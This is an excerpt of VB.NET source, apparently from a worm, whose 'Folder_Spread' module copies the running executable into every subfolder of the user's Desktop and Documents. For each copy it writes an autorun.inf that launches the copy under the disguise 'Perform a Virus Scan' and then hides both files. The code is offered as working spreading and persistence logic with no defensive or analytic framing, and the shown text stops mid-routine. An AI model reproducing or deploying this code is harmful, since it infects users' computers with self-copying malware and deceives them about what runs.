...
Public Module A
    ...
    Public Sub Main()
        ...
        If FolderSpread = "True" Then
            Call Folder_Spread.SpreadCode("C:\Users\" & Environment.UserName & "\Desktop\")
            Call Folder_Spread.SpreadCode("C:\Users\" & Environment.UserName & "\Documents\")
        End If
...
Module Folder_Spread
    Public Function SpreadCode(ByVal location) As String ' Ask for folders
        ...
        For Each subdi As DirectoryInfo In di.GetDirectories
            ...
            If File.Exists(folders & "\" & exen) Then
                ...
                IO.File.Delete(folders & "\" & "autorun.inf")
                IO.File.Copy(Application.ExecutablePath, folders & "\" & exen)
                Dim AutoStart = New StreamWriter(folders & "\autorun.inf")
                AutoStart.WriteLine("[autorun]")
                AutoStart.WriteLine("open=" & folders & "\" & exen)
                AutoStart.WriteLine("shellexecute=" & folders & "\" & exen, 1)
                AutoStart.WriteLine("shellopencommand=" & folders & "\" & exen)
                AutoStart.WriteLine("shellexplorecommand=" & folders & "\" & exen)
                AutoStart.WriteLine("action=Perform a Virus Scan")
                AutoStart.Close()
                IO.File.SetAttributes(folders & "\" & exen, FileAttributes.Hidden)
                IO.File.SetAttributes(folders & "\" & "autorun.inf", FileAttributes.Hidden)
            Else
                IO.File.Copy(Application.ExecutablePath, folders & "\" & exen)
                Dim AutoStart = New StreamWriter(folders & "\autorun.inf")
                AutoStart.WriteLine("[autorun]")
